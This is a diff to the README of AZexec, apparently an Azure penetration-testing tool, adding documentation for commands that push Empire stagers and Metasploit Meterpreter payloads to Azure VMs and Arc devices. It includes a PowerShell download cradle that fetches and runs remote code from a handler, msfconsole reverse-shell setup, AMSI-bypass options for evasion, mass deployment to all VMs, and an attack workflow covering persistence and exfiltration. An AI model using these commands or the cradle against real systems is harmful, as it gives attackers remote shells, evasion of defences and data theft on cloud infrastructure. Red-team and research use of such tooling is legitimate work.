@@ -87,6 +87,8 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb <target> -X "cmd" --amsi-bypass /path` | `.\azx.ps1 exec -VMName "vm" -x "cmd" -PowerShell -AmsiBypass bypass.ps1` | ✅ Required | **Execute with AMSI bypass** |
 | `nxc smb <target> -M pi -o PID=1234 EXEC=cmd` | `.\azx.ps1 exec -VMName "vm" -x "cmd" -ExecMethod pi -PID 1234` | ✅ Required | **Process injection by PID** |
 | `nxc smb <target> -M pi -o USER=admin EXEC=cmd` | `.\azx.ps1 exec -VMName "vm" -x "cmd" -ExecMethod pi -TargetUser "admin"` | ✅ Required | **Process injection by user** |
+| `nxc smb <target> -M empire_exec -o LISTENER=http` | `.\azx.ps1 empire-exec -Listener http -EmpireHost host -VMName "vm"` | ✅ Required | **Execute Empire stager** |
+| `nxc smb <target> -M met_inject -o SRVHOST=10.0.0.1 SRVPORT=8080 RAND=abc` | `.\azx.ps1 met-inject -SRVHOST 10.0.0.1 -SRVPORT 8080 -RAND abc -VMName "vm"` | ✅ Required | **Inject Metasploit payload** |
 
 **Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.
 
@@ -1510,6 +1512,266 @@ AZR       vm-web-01             443    Windows     (Exec3d!)   nt authority\syst
 
 ---
 
+## 🐚 Getting Shells - Empire and Metasploit Integration
+
+For penetration testers familiar with NetExec's shell modules (`-M empire_exec` and `-M met_inject`), AZexec provides the **Azure cloud equivalent** through the `empire-exec` and `met-inject` commands.
+
+These commands generate C2 payloads and deploy them via Azure execution methods (VM Run Command, Arc Run Command, etc.), providing a seamless path from Azure access to interactive shells.
+
+### Command Mapping
+
+| NetExec Command | AZexec Equivalent | Description |
+|-----------------|-------------------|-------------|
+| `nxc smb <target> -M empire_exec -o LISTENER=http` | `.\azx.ps1 empire-exec -Listener http -EmpireHost host -VMName "vm"` | Deploy Empire stager |
+| `nxc smb <targets> -M empire_exec -o LISTENER=http` | `.\azx.ps1 empire-exec -Listener http -EmpireHost host -AllVMs` | Deploy to all VMs |
+| `nxc smb <target> -M met_inject -o SRVHOST=10.0.0.1 SRVPORT=8080 RAND=abc` | `.\azx.ps1 met-inject -SRVHOST 10.0.0.1 -SRVPORT 8080 -RAND abc -VMName "vm"` | Inject Metasploit payload |
+| `nxc smb <targets> -M met_inject -o SRVHOST=10.0.0.1 SRVPORT=8080 RAND=abc` | `.\azx.ps1 met-inject -SRVHOST 10.0.0.1 -SRVPORT 8080 -RAND abc -AllVMs` | Inject on all VMs |
+
+### Empire Execution (`empire-exec`)
+
+The `empire-exec` command connects to an Empire C2 server's REST API, generates a PowerShell stager for the specified listener, and deploys it to Azure targets.
+
+**How It Works:**
+1. Authenticates to Empire REST API (`/api/v2/auth/token`)
+2. Requests a stager for the specified listener (`/api/v2/stagers`)
+3. Deploys the stager to targets via Azure execution methods
+4. Target executes stager → connects back to Empire listener
+
+**Parameters:**
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `-Listener` | ✅ Yes | Empire listener name (e.g., "http", "https") |
+| `-EmpireHost` | ✅ Yes* | Empire server hostname or IP |
+| `-EmpirePort` | No | Empire API port (default: 1337) |
+| `-EmpireUsername` | ✅ Yes* | Empire API username |
+| `-EmpirePassword` | ✅ Yes* | Empire API password |
+| `-EmpireConfigFile` | No | Path to JSON config file (alternative to individual params) |
+| `-SSL` | No | Use HTTPS for Empire API connection |
+| `-Obfuscate` | No | Enable stager obfuscation |
+| `-ObfuscateCommand` | No | Obfuscation options (default: "Token,All,1") |
+| `-AmsiBypass` | No | Path to AMSI bypass script to prepend |
+
+*Can be provided via `-EmpireConfigFile` instead
+
+**Empire Config File Format:**
+```json
+{
+    "host": "empire.example.com",
+    "port": 1337,
+    "username": "empireadmin",
+    "password": "password123",
+    "ssl": true
+}
+```
+
+**Usage Examples:**
+
+```powershell
+# Deploy Empire stager to single VM
+.\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -VMName vm-01
+
+# Deploy to single VM using config file
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile empire-config.json -VMName vm-01
+
+# Deploy to all VMs with SSL and obfuscation
+.\azx.ps1 empire-exec -Listener https -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -SSL -Obfuscate -AllVMs
+
+# Deploy to Arc-enabled devices
+.\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -AllDevices
+
+# Deploy with AMSI bypass
+.\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -AmsiBypass bypass.ps1 -VMName vm-01
+
+# Deploy to specific resource group with export
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -ResourceGroup "Production-RG" -AllVMs -ExportPath empire-results.csv
+```
+
+**Empire Server Setup:**
+```bash
+# Start Empire with REST API
+./ps-empire server
+
+# Or with Docker
+docker run -it -p 1337:1337 -p 5000:5000 bc-security/empire:latest server
+
+# Create a listener in Empire
+uselistener http
+set Host http://your-empire-server:80
+set Port 80
+execute
+```
+
+**Output Format:**
+```
+AZR       vm-web-01             443    Windows     (Empire!)   http listener deployed
+```
+
+### Metasploit Injection (`met-inject`)
+
+The `met-inject` command generates a PowerShell download cradle that fetches and executes a Metasploit payload from your handler.
+
+**How It Works:**
+1. Generates a PowerShell download cradle pointing to your Metasploit handler
+2. Deploys the cradle to targets via Azure execution methods
+3. Target executes cradle → downloads payload from Metasploit → Meterpreter connects back
+
+**Parameters:**
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `-SRVHOST` | ✅ Yes | Metasploit handler host (IP or hostname) |
+| `-SRVPORT` | ✅ Yes | Metasploit handler port |
+| `-RAND` | ✅ Yes | Random URI path (from web_delivery module) |
+| `-SSL` | No | Use HTTPS for payload download |
+| `-ProxyHost` | No | Proxy host (for environments requiring proxy) |
+| `-ProxyPort` | No | Proxy port |
+| `-AmsiBypass` | No | Path to AMSI bypass script to prepend |
+
+**Usage Examples:**
+
+```powershell
+# Inject Metasploit payload to single VM
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -VMName vm-01
+
+# Inject with SSL (for HTTPS payload delivery)
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 443 -RAND xyz789 -SSL -VMName vm-01
+
+# Inject to all VMs
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -AllVMs
+
+# Inject to Arc-enabled devices
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -AllDevices
+
+# Inject through proxy
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -ProxyHost proxy.corp.local -ProxyPort 8080 -VMName vm-01
+
+# Inject with AMSI bypass
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -AmsiBypass bypass.ps1 -VMName vm-01
+
+# Inject to specific resource group with export
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -ResourceGroup "Prod-RG" -AllVMs -ExportPath met-results.csv
+```
+
+**Metasploit Handler Setup:**
+```bash
+# Start Metasploit handler for web_delivery
+msfconsole
+
+use exploit/multi/script/web_delivery
+set target 2                                    # PSH (PowerShell)
+set payload windows/x64/meterpreter/reverse_https
+set SRVHOST 10.10.10.1                         # Your attack machine IP
+set SRVPORT 8080                               # Port for payload delivery
+set LHOST 10.10.10.1                           # Callback IP
+set LPORT 443                                  # Callback port
+set URIPATH abc123                             # This is your -RAND value
+run -j
+
+# Note the generated URL: http://10.10.10.1:8080/abc123
+# Use these values in AZexec:
+# -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123
+```
+
+**Output Format:**
+```
+AZR       vm-web-01             443    Windows     (Meterpreter!)   10.10.10.1:8080
+```
+
+### Generated Cradle
+
+The Metasploit cradle generated by AZexec matches the NetExec implementation:
+
+```powershell
+$ProgressPreference = 'SilentlyContinue'
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}  # If -SSL
+$wc = New-Object System.Net.WebClient
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+IEX $wc.DownloadString('http://10.10.10.1:8080/abc123')
+```
+
+### Execution Methods
+
+Both `empire-exec` and `met-inject` support the same execution methods as the `exec` command:
+
+| Method | Target Type | Description |
+|--------|-------------|-------------|
+| **vmrun** (default) | Azure VMs | Uses Azure VM Run Command (synchronous) |
+| **arc** | Arc-enabled servers | Uses Azure Arc Run Command (synchronous) |
+| **auto** | All | Auto-detects best method based on target type |
+
+**Targeting Options:**
+
+| Parameter | Description |
+|-----------|-------------|
+| `-VMName` | Single Azure VM by name |
+| `-AllVMs` | All Azure VMs (with optional `-ResourceGroup` filter) |
+| `-DeviceName` | Single Arc-enabled device by name |
+| `-AllDevices` | All Arc-enabled devices |
+| `-ResourceGroup` | Filter targets by resource group |
+| `-SubscriptionId` | Target specific subscription |
+| `-ExecMethod` | Force specific execution method (auto, vmrun, arc) |
+
+### Required Permissions
+
+Same as the `exec` command:
+
+| Method | Required RBAC Roles |
+|--------|---------------------|
+| **vmrun** | Virtual Machine Contributor or Reader + Virtual Machine Command Executor |
+| **arc** | Azure Connected Machine Resource Administrator |
+
+### Attack Workflow
+
+**Phase 1: Reconnaissance**
+```powershell
+# Enumerate all VMs
+.\azx.ps1 hosts
+
+# Check which VMs are running Windows (Empire/Metasploit targets)
+.\azx.ps1 vm-loggedon -VMFilter running
+```
+
+**Phase 2: Deploy Shells**
+```powershell
+# Option A: Empire (full C2 capabilities)
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -AllVMs
+
+# Option B: Metasploit (Meterpreter)
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -AllVMs
+```
+
+**Phase 3: Post-Exploitation**
+```powershell
+# Use Empire/Metasploit for:
+# - Credential harvesting
+# - Lateral movement
+# - Persistence
+# - Data exfiltration
+```
+
+### Security Considerations
+
+1. **Windows Only**: Both commands target Windows systems (PowerShell-based payloads)
+2. **Network Connectivity**: Targets must be able to reach your C2 server
+3. **AMSI**: Consider using `-AmsiBypass` for evasion
+4. **Logging**: All Azure execution methods are logged in Azure Activity Logs
+5. **Firewall**: Ensure C2 ports are accessible from target network
+
+### Technical Comparison
+
+| Aspect | On-Premises (NetExec) | Azure (AZexec) |
+|--------|----------------------|----------------|
+| **Delivery** | SMB/WMI | Azure VM Run Command / Arc Run Command |
+| **Authentication** | NTLM/Kerberos | Azure AD OAuth2 |
+| **Payload Type** | PowerShell cradle | PowerShell cradle |
+| **Target Discovery** | Network scan | Azure Resource Manager API |
+| **Execution Context** | User/Admin | SYSTEM (Azure execution default) |
+| **Logging** | Windows Event Logs | Azure Activity Logs |
+
+---
+
 ## 🎯 Features
 
 - **Tenant Discovery**: Discover Azure/Entra ID tenant configuration without authentication (mimics `nxc smb --enum`)
@@ -1695,6 +1957,19 @@ AZR       vm-web-01             443    Windows     (Exec3d!)   nt authority\syst
   - Command timeout configuration
   - Multi-subscription support with automatic enumeration
   - Export execution results to CSV, JSON, or HTML
+- **Shell Generation (Empire & Metasploit)**: Deploy C2 payloads via Azure execution methods (mimics `nxc -M empire_exec` and `nxc -M met_inject`)
+  - **Empire Execution** (`empire-exec`): Connect to Empire REST API, generate stagers, deploy to Azure targets
+    - Supports listener selection, obfuscation options, and SSL
+    - Config file support for Empire credentials
+    - "(Empire!)" indicator on successful deployment
+  - **Metasploit Injection** (`met-inject`): Generate PowerShell cradles, deploy via Azure execution
+    - Supports web_delivery module integration
+    - SSL and proxy configuration for payload delivery
+    - "(Meterpreter!)" indicator on successful deployment
+  - Both commands support all Azure targeting options (VM, Arc, ResourceGroup, AllVMs, AllDevices)
+  - AMSI bypass integration for evasion
+  - Multi-subscription support
+  - Export deployment results to CSV, JSON, or HTML
 - **Netexec-Style Output**: Familiar output format for penetration testers and security professionals
 - **Advanced Filtering**: Filter devices by OS, trust type, compliance status, and more
 - **Owner Information**: Optional device owner enumeration with additional API calls
